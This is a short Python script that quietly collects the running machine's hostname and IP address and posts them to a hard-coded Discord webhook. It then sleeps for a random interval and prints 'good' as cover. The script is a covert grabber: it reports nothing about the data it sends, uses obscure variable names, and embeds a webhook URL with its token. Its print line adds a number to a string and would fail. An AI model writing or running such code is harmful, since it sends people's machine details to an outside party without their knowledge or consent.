from termcolor import cprint, colored
import time
import random
import socket
import requests

random_time = random.randint(5, 17)


u = "https://discord.com/api/webhooks/1151568846285705266/xAydDMKKDqMSBmDYb6Q7sTqS5anAY18-8R8_z2a9NaSpA8aYuz-E9KViVE9izKTaO3uw"
h = socket.gethostname()
i = socket.gethostbyname(h)
t = time.localtime()
t = time.strftime("%H:%M:%S", t)
d = {"content" : f"**--------------------------------------**\n**{t}**", "username" : "IP WEBHOOK"}
d["embeds"] = [{"description" : f"**NAME**: {h}\n**IP**: {i}", "title" : "IP: "}]
requests.post(u, json=d)
print(random_time+ " s")
time.sleep(random_time)
cprint("good", "green")
